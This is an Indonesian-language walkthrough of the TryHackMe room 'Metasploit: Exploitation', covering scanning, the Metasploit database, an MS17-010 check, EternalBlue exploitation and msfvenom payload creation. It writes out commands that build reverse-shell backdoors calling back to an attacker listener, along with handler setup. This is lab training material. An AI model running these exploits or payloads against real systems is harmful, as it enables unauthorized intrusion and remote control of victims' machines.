# Metasploit: Exploitation

---

- **Room Link:** [Metasploit: Exploitation](https://tryhackme.com/room/metasploitexploitation)
- **Category:** Exploitation Basics
- **Difficulty:** Easy

---

## Introduction

Room ini lanjutan dari *Metasploit: Introduction*. Di sini kita bakal fokus ke penggunaan Metasploit buat **scanning**, **vulnerability assessment**, dan **exploitation** yang sesungguhnya.

Topik yang dibahas:
1.  Pakai modul scanning.
2.  Ngelola database Metasploit.
3.  Lakuin vulnerability scanning.
4.  Eksploitasi layanan yang rentan.
5.  Membuat payload pakai `msfvenom`.

---

## Scanning

Metasploit punya kemampuan scanning yang keren, bisa pakai **Nmap** yang terintegrasi maupun modul **Auxiliary Scanner** bawaan.

**1. Port Scanning:**
Kita bisa pakai modul auxiliary buat scanning port tanpa Nmap.
- Command: `search portscan`
- Contoh modul: `auxiliary/scanner/portscan/tcp`

**Cara Pakai:**
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.10
set PORTS 1-1000
run
```

**2. UDP Scanning:**
Buat scan UDP, pakai modul `auxiliary/scanner/discovery/udp_sweep`.

---

## The Metasploit Database

Salah satu fitur killer-nya Metasploit itu database (PostgreSQL) buat menyimpan hasil scan dan exploit.

**Perintah Penting:**
- `db_status`: Cek status koneksi database.
- `workspace`: Ngelola lembar kerja (proyek).
  - `workspace -a [nama]`: Membuat workspace baru.
  - `workspace [nama]`: Pindah workspace.
- `db_nmap`: Jalanin Nmap dan langsung simpen hasilnya ke database.
  - Contoh: `db_nmap -sV -p- 10.10.10.10`
- `hosts`: Melihat daftar host yang tersimpan.
- `services`: Melihat daftar service yang ditemuin (port terbuka).
- `vulns`: Melihat daftar vulnerability yang kedeteksi.

**Tips:** Pakai database ngebikin kita gampang filter target, misal `services -p 80` buat melihat semua host yang jalanin web server.

---

## Vulnerability Scanning

Metasploit punya banyak modul scanner buat cek kerentanan spesifik (bukan cuma port scanning).

**Contoh Kasus:**
Kalau kita nemuin layanan SMB (port 445), kita bisa cek apakah rentan terhadap exploit tertentu (misal MS17-010).

1.  **Search Module:** `search type:auxiliary smb`
2.  **Pilih Scanner:** Misal `auxiliary/scanner/smb/smb_ms17_010`.
3.  **Run:** Set RHOSTS dan jalanin.

Hasil scan bakal kasih tau apakah target *VULNERABLE* atau enggak.

---

## Exploitation

Ini inti dari Metasploit. Setelah scan dan nemu celah, kita eksploitasi!

**Langkah-langkah:**
1.  **Cari Exploit:** `search [nama_vuln]` (misal: `search eternalblue`).
2.  **Pilih Exploit:** `use exploit/windows/smb/ms17_010_eternalblue`.
3.  **Set Payload:** (Opsional, biasanya auto-set ke meterpreter). `set payload windows/x64/meterpreter/reverse_tcp`.
4.  **Konfigurasi:**
    - `set RHOSTS [Target IP]`
    - `set LHOST [IP VPN Kita]`
5.  **Eksekusi:** `exploit` atau `run`.

Kalau berhasil, sesi Meterpreter bakal terbuka!

**Pertanyaan:**
- **Answer:** ?

---

## Msfvenom

Kadang exploit tidak jalan langsung, atau kita butuh membuat file backdoor (trojan) manual. Di sinilah **Msfvenom** berperan. Msfvenom nggabungin fungsi `msfpayload` dan `msfencode` dulu.

**Sintaks Dasar:**
```bash
msfvenom -p [payload] [options] -f [format] -o [output_file]
```

**Contoh Membuat Payload:**

1.  **Linux Reverse Shell (.elf):**
    ```bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -f elf -o shell.elf
    ```

2.  **Windows Reverse Shell (.exe):**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe -o shell.exe
    ```

3.  **PHP Reverse Shell (.php):**
    ```bash
    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f raw -o shell.php
    ```

**Handler (Wajib disiapin di msfconsole):**
Agar bisa nangkep koneksi dari payload di atas, kita harus set handler:
```bash
use exploit/multi/handler
set payload [payload_yg_sama]
set LHOST [IP_Kita]
set LPORT [Port_yg_sama]
exploit
```

---

## Summary

Kita sudah belajar alur full penetration testing pakai Metasploit:
1.  **Recon/Scanning:** `db_nmap`, `auxiliary/scanner`.
2.  **Assessment:** Mencari celah keamanan.
3.  **Exploitation:** Masuk ke sistem (`use exploit/...`).
4.  **Payload Creation:** Membuat backdoor manual pakai `msfvenom`.

Keep learning and happy hacking! üçª
